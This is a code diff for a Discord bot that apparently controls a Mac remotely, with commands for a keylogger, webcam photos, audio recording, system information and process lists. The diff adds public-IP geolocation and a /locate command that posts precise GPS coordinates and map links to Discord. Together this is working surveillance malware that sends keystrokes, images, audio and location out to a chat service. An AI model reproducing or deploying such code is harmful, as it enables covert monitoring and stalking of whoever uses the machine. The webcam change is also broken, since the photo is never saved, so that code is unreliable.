@@ -79,11 +79,272 @@ def record_audio(duration=10, sample_rate=44100):
     return audio_path
 
 def get_system_info():
-    """Get basic system information as a string."""
-    system_info = f"System: {platform.system()} {platform.release()}\n"
-    system_info += f"Processor: {platform.processor()}\n"
-    system_info += f"Python: {platform.python_version()}"
+    """Get comprehensive system information as a string."""
+    import requests
+    from datetime import datetime
+    
+    system_info = "=== SYSTEM INFORMATION ===\n\n"
+    
+    # Date and Time
+    current_time = datetime.now()
+    system_info += f"📅 **Current Time**: {current_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
+    system_info += f"🌍 **Timezone**: {current_time.astimezone().tzname()}\n\n"
+    
+    # macOS Version and Model
+    try:
+        mac_version = platform.mac_ver()[0]
+        system_info += f"🖥️ **macOS Version**: {mac_version}\n"
+    except Exception:
+        system_info += f"🖥️ **macOS Version**: Unknown\n"
+    
+    try:
+        # Get Mac model using system_profiler
+        model_result = subprocess.run(['system_profiler', 'SPHardwareDataType'], 
+                                    capture_output=True, text=True, check=False)
+        if model_result.returncode == 0:
+            for line in model_result.stdout.split('\n'):
+                if 'Model Name:' in line:
+                    model = line.split('Model Name:')[1].strip()
+                    system_info += f"💻 **Mac Model**: {model}\n"
+                    break
+                elif 'Model Identifier:' in line:
+                    identifier = line.split('Model Identifier:')[1].strip()
+                    system_info += f"🔧 **Model ID**: {identifier}\n"
+        else:
+            system_info += f"💻 **Mac Model**: Unknown\n"
+    except Exception:
+        system_info += f"💻 **Mac Model**: Unknown\n"
+    
+    # CPU Information
+    try:
+        cpu_count = psutil.cpu_count(logical=False)
+        cpu_count_logical = psutil.cpu_count(logical=True)
+        cpu_freq = psutil.cpu_freq()
+        cpu_percent = psutil.cpu_percent(interval=1)
+        
+        system_info += f"🔥 **CPU Cores**: {cpu_count} physical, {cpu_count_logical} logical\n"
+        if cpu_freq:
+            system_info += f"⚡ **CPU Frequency**: {cpu_freq.current:.1f} MHz (Max: {cpu_freq.max:.1f} MHz)\n"
+        system_info += f"📊 **CPU Usage**: {cpu_percent}%\n"
+        system_info += f"🖲️ **Processor**: {platform.processor()}\n\n"
+    except Exception as e:
+        system_info += f"🔥 **CPU Info**: Error getting CPU info\n\n"
+    
+    # Memory Information
+    try:
+        memory = psutil.virtual_memory()
+        memory_gb_total = memory.total / (1024**3)
+        memory_gb_used = memory.used / (1024**3)
+        memory_gb_available = memory.available / (1024**3)
+        
+        system_info += f"🧠 **Total RAM**: {memory_gb_total:.2f} GB\n"
+        system_info += f"📈 **Used RAM**: {memory_gb_used:.2f} GB ({memory.percent}%)\n"
+        system_info += f"📉 **Available RAM**: {memory_gb_available:.2f} GB\n\n"
+    except Exception:
+        system_info += f"🧠 **RAM Info**: Error getting memory info\n\n"
+    
+    # Battery Information
+    try:
+        battery = psutil.sensors_battery()
+        if battery:
+            battery_percent = battery.percent
+            plugged = "🔌 Plugged In" if battery.power_plugged else "🔋 On Battery"
+            if battery.secsleft != psutil.POWER_TIME_UNLIMITED and battery.secsleft > 0:
+                hours, remainder = divmod(battery.secsleft, 3600)
+                minutes = remainder // 60
+                time_left = f" ({hours}h {minutes}m remaining)"
+            else:
+                time_left = ""
+            system_info += f"🔋 **Battery**: {battery_percent}% - {plugged}{time_left}\n\n"
+        else:
+            system_info += f"🔋 **Battery**: No battery detected (Desktop Mac)\n\n"
+    except Exception:
+        system_info += f"🔋 **Battery**: Error getting battery info\n\n"
+    
+    # Network and Location
+    try:
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+        system_info += f"🌐 **Hostname**: {hostname}\n"
+        system_info += f"🔗 **Local IP**: {local_ip}\n"
+        
+        # Get public IP and location
+        try:
+            response = requests.get('https://ipapi.co/json/', timeout=5)
+            if response.status_code == 200:
+                data = response.json()
+                public_ip = data.get('ip', 'Unknown')
+                city = data.get('city', 'Unknown')
+                region = data.get('region', 'Unknown')
+                country = data.get('country_name', 'Unknown')
+                isp = data.get('org', 'Unknown')
+                
+                system_info += f"🌍 **Public IP**: {public_ip}\n"
+                system_info += f"📍 **Location**: {city}, {region}, {country}\n"
+                system_info += f"🏢 **ISP**: {isp}\n"
+            else:
+                system_info += f"🌍 **Public IP**: Unable to fetch\n"
+                system_info += f"📍 **Location**: Unable to fetch\n"
+        except Exception:
+            system_info += f"🌍 **Public IP**: Unable to fetch (No internet)\n"
+            system_info += f"📍 **Location**: Unable to fetch\n"
+    except Exception:
+        system_info += f"🌐 **Network Info**: Error getting network info\n"
+    
+    # Display Information
+    try:
+        from PIL import ImageGrab
+        import Quartz
+        
+        # Get screen size using PIL
+        screen = ImageGrab.grab()
+        width, height = screen.size
+        system_info += f"\n📺 **Screen Resolution**: {width} x {height} pixels\n"
+        
+        # Get additional display info using Quartz
+        try:
+            main_display = Quartz.CGMainDisplayID()
+            display_bounds = Quartz.CGDisplayBounds(main_display)
+            display_width = int(display_bounds.size.width)
+            display_height = int(display_bounds.size.height)
+            
+            # Get display scaling factor
+            backing_scale = Quartz.CGDisplayCreateImage(main_display)
+            if backing_scale:
+                system_info += f"🔍 **Display Scale**: Retina/HiDPI detected\n"
+            
+            # Calculate approximate physical size (this is an estimate)
+            dpi = 72  # Default macOS DPI
+            width_inches = display_width / dpi
+            height_inches = display_height / dpi
+            diagonal_inches = (width_inches**2 + height_inches**2)**0.5
+            
+            system_info += f"📐 **Estimated Size**: {diagonal_inches:.1f}\" diagonal\n"
+            
+        except Exception:
+            system_info += f"📺 **Display Details**: Basic resolution only\n"
+            
+    except Exception:
+        system_info += f"\n📺 **Screen Info**: Unable to detect screen size\n"
+
+    # Additional System Info
+    system_info += f"\n=== ADDITIONAL INFO ===\n"
+    system_info += f"🐍 **Python Version**: {platform.python_version()}\n"
+    system_info += f"📦 **Platform**: {platform.platform()}\n"
+    system_info += f"🖥️ **Architecture**: {platform.architecture()[0]}\n"
+    
     return system_info
+
+def get_precise_location():
+    """Get precise location using macOS Core Location Services via Shortcuts.
+    
+    Returns:
+        dict: Location data with coordinates, address, and timestamp
+    """
+    from datetime import datetime
+    import json
+    
+    location_data = {
+        'success': False,
+        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
+        'timezone': datetime.now().astimezone().tzname(),
+        'latitude': None,
+        'longitude': None,
+        'address': None,
+        'error': None
+    }
+    
+    try:
+        # First, try to get location using the required shortcut
+        result = subprocess.run([
+            'shortcuts', 'run', 'Get Location Data'
+        ], capture_output=True, text=True, timeout=30)
+        
+        if result.returncode == 0 and result.stdout.strip():
+            output = result.stdout.strip()
+            
+            try:
+                # Try to parse as JSON if the shortcut returns structured data
+                location_info = json.loads(output)
+                location_data.update({
+                    'success': True,
+                    'latitude': location_info.get('latitude'),
+                    'longitude': location_info.get('longitude'),
+                    'address': location_info.get('address', 'Address not available')
+                })
+                return location_data
+            except json.JSONDecodeError:
+                # If not JSON, try to parse plain text coordinates
+                if ',' in output:
+                    coords = output.split(',')
+                    if len(coords) >= 2:
+                        try:
+                            latitude = float(coords[0].strip())
+                            longitude = float(coords[1].strip())
+                            
+                            # Get address using reverse geocoding if we have coordinates
+                            address = get_address_from_coordinates(latitude, longitude)
+                            
+                            location_data.update({
+                                'success': True,
+                                'latitude': latitude,
+                                'longitude': longitude,
+                                'address': address
+                            })
+                            return location_data
+                        except ValueError:
+                            location_data['error'] = "Invalid coordinate format from shortcut"
+                else:
+                    location_data['error'] = "Unexpected shortcut output format"
+        else:
+            if "doesn't exist" in result.stderr.lower() or "not found" in result.stderr.lower():
+                location_data['error'] = "Required shortcut 'Get Location Data' not found"
+            elif "permission" in result.stderr.lower() or "denied" in result.stderr.lower():
+                location_data['error'] = "Location permission denied - check Privacy settings"
+            else:
+                location_data['error'] = f"Shortcut execution failed: {result.stderr.strip() if result.stderr else 'No output received'}"
+            
+    except subprocess.TimeoutExpired:
+        location_data['error'] = "Location request timed out - GPS may be unavailable"
+    except FileNotFoundError:
+        location_data['error'] = "Shortcuts app not found - macOS 12+ required"
+    except Exception as e:
+        location_data['error'] = f"Unexpected error: {str(e)}"
+    
+    return location_data
+
+def get_address_from_coordinates(latitude, longitude):
+    """Get human-readable address from coordinates using reverse geocoding."""
+    try:
+        import requests
+        # Use a reliable reverse geocoding service
+        response = requests.get(
+            f"https://api.bigdatacloud.net/data/reverse-geocode-client?latitude={latitude}&longitude={longitude}&localityLanguage=en",
+            timeout=10
+        )
+        
+        if response.status_code == 200:
+            data = response.json()
+            
+            # Build address from components
+            address_parts = []
+            
+            if data.get('locality'):  # City
+                address_parts.append(data['locality'])
+            if data.get('principalSubdivision'):  # State/Province
+                address_parts.append(data['principalSubdivision'])
+            if data.get('countryName'):  # Country
+                address_parts.append(data['countryName'])
+            
+            if address_parts:
+                return ', '.join(address_parts)
+            else:
+                return f"Coordinates: {latitude:.6f}, {longitude:.6f}"
+        else:
+            return f"Coordinates: {latitude:.6f}, {longitude:.6f}"
+            
+    except Exception:
+        return f"Coordinates: {latitude:.6f}, {longitude:.6f}"
 
 def get_ip_address():
     hostname = socket.gethostname()
@@ -165,11 +426,8 @@ def get_top_processes(sort_by='ram', limit=15):
     
     # Convert to list and sort
     processes = list(process_groups.values())
-    
-    if sort_by == 'cpu':
-        processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
-    else:  # default to RAM
-        processes.sort(key=lambda x: x['rss'], reverse=True)
+    sort_key = 'cpu_percent' if sort_by == 'cpu' else 'rss'
+    processes.sort(key=lambda x: x[sort_key], reverse=True)
     
     return processes[:limit]
 
@@ -178,18 +436,16 @@ def take_webcam_photo(warmup_seconds: float = 0.3):
     cap = cv2.VideoCapture(0)
     if not cap.isOpened():
         return None
-    try:
-        # Allow the camera to warm up
-        time.sleep(warmup_seconds)
-        # Capture frame after warmup
-        ret, frame = cap.read()
-        if not ret or frame is None:
-            return None
+    # Allow the camera to warm up
+    time.sleep(warmup_seconds)
+    # Capture frame after warmup
+    ret, frame = cap.read()
+    cap.release()
+    if not ret or frame is None:
+        return None
         photo_path = f'webcam_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg'
         cv2.imwrite(photo_path, frame)
         return photo_path
-    finally:
-        cap.release()
 
 import Quartz
 
@@ -811,8 +1067,9 @@ async def help_command(interaction: discord.Interaction):
 /media - Control media playback (play/pause/next/prev)
 /volume - Set system volume (0-100%)
 /keylogger - Start or stop the keylogger
-/sysinfo - Show system information
+/sysinfo - Show comprehensive system information (location, battery, CPU, RAM, etc.)
 /ip - Show IP address
+/locate - Get precise location with GPS coordinates and timestamp
 /uptime - Show system uptime
 /processes - Show top 15 processes by CPU or RAM usage
 /camera - Take a webcam photo
@@ -920,14 +1177,18 @@ async def toggle_keylogger(interaction: discord.Interaction, action: discord.app
         logger.error(f"Error with keylogger: {str(e)}")
         await interaction.response.send_message(f"Error with keylogger: {str(e)}")
 
-@bot.tree.command(name='sysinfo', description='Show detailed system information')
+@bot.tree.command(name='sysinfo', description='Show comprehensive system information (location, battery, CPU, RAM, etc.)')
 async def system_info(interaction: discord.Interaction):
     try:
+        await interaction.response.defer()  # This might take a few seconds due to network requests
         info = get_system_info()
-        await interaction.response.send_message(f"💻 System Info:\n```{info}```")
+        await interaction.followup.send(f"```{info}```")
     except Exception as e:
         logger.error(f"Error getting system info: {str(e)}")
-        await interaction.response.send_message(f"Error getting system info: {str(e)}")
+        if not interaction.response.is_done():
+            await interaction.response.send_message(f"Error getting system info: {str(e)}")
+        else:
+            await interaction.followup.send(f"Error getting system info: {str(e)}")
 
 @bot.tree.command(name='ip', description='Show the system IP address')
 async def ip_address(interaction: discord.Interaction):
@@ -937,6 +1198,84 @@ async def ip_address(interaction: discord.Interaction):
     except Exception as e:
         logger.error(f"Error getting IP address: {str(e)}")
         await interaction.response.send_message(f"Error getting IP address: {str(e)}")
+
+@bot.tree.command(name='locate', description='Get precise location with GPS coordinates and timestamp')
+async def locate(interaction: discord.Interaction):
+    """Get current location using macOS Location Services (GPS-only)."""
+    try:
+        await interaction.response.defer()  # This may take time for location services
+        
+        location_data = get_precise_location()
+        
+        if location_data['success']:
+            # Format the response message
+            response_lines = []
+            response_lines.append(f"📍 **Location Retrieved**: {location_data['timestamp']} {location_data['timezone']}")
+            response_lines.append("")
+            
+            if location_data['latitude'] and location_data['longitude']:
+                lat = location_data['latitude']
+                lon = location_data['longitude']
+                
+                # Format coordinates with proper precision
+                response_lines.append(f"🌐 **GPS Coordinates**: {lat:.6f}, {lon:.6f}")
+                
+                if location_data['address']:
+                    response_lines.append(f"🏠 **Address**: {location_data['address']}")
+                
+                # Add map links
+                google_maps_url = f"https://maps.google.com/?q={lat},{lon}"
+                apple_maps_url = f"http://maps.apple.com/?q={lat},{lon}"
+                response_lines.append(f"🗺️ **Maps**: [Google Maps]({google_maps_url}) | [Apple Maps]({apple_maps_url})")
+                
+            else:
+                response_lines.append("❌ **Coordinates**: Not available")
+                if location_data['address']:
+                    response_lines.append(f"🏠 **Address**: {location_data['address']}")
+            
+            response_text = "\n".join(response_lines)
+            await interaction.followup.send(response_text)
+            
+        else:
+            # Location failed - provide detailed setup instructions
+            error_message = f"❌ **Location Failed**: {location_data['error']}\n\n"
+            
+            if "not found" in location_data['error']:
+                error_message += "🔧 **Required Setup - Create Location Shortcut**:\n"
+                error_message += "1. Open **Shortcuts** app on macOS\n"
+                error_message += "2. Click **'+'** to create new shortcut\n"
+                error_message += "3. Name it exactly: **'Get Location Data'**\n"
+                error_message += "4. Search and add **'Get Current Location'** action\n"
+                error_message += "5. Save the shortcut\n"
+                error_message += "6. **Test manually**: Run shortcut to grant permissions\n"
+            elif "permission" in location_data['error'].lower():
+                error_message += "🔐 **Location Permission Required**:\n"
+                error_message += "1. Open **System Preferences > Security & Privacy**\n"
+                error_message += "2. Go to **Privacy > Location Services**\n"
+                error_message += "3. Enable **Location Services** (if disabled)\n"
+                error_message += "4. Find **Shortcuts** app and enable it\n"
+                error_message += "5. Retry the `/locate` command\n"
+            else:
+                error_message += "🔧 **Troubleshooting**:\n"
+                error_message += "• Ensure **Shortcuts** app is installed (macOS 12+)\n"
+                error_message += "• Create shortcut named **'Get Location Data'**\n"
+                error_message += "• Grant location permissions to Shortcuts app\n"
+                error_message += "• Test shortcut manually before using bot\n"
+            
+            error_message += "\n🌍 **Note**: This command requires GPS-based location services"
+            error_message += "\n🔒 **Privacy**: Location data is processed locally and sent only to Discord"
+            
+            await interaction.followup.send(error_message)
+            
+    except Exception as e:
+        logger.error(f"Error in locate command: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error getting location: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error getting location: {str(e)}")
+        except Exception:
+            pass  # If we can't send error message, just log it
 
 @bot.tree.command(name='uptime', description='Show system uptime')
 async def uptime(interaction: discord.Interaction):
@@ -1008,7 +1347,7 @@ async def execute_all(interaction: discord.Interaction):
         os.remove(audio_path)
         results.append("✓ Audio recording")
         system_info = get_system_info()
-        await interaction.followup.send(f"💻 System Info:\n```{system_info}```")
+        await interaction.followup.send(f"```{system_info}```")
         results.append("✓ System info")
         ip = get_ip_address()
         await interaction.followup.send(f"🌐 IP Address: {ip}")
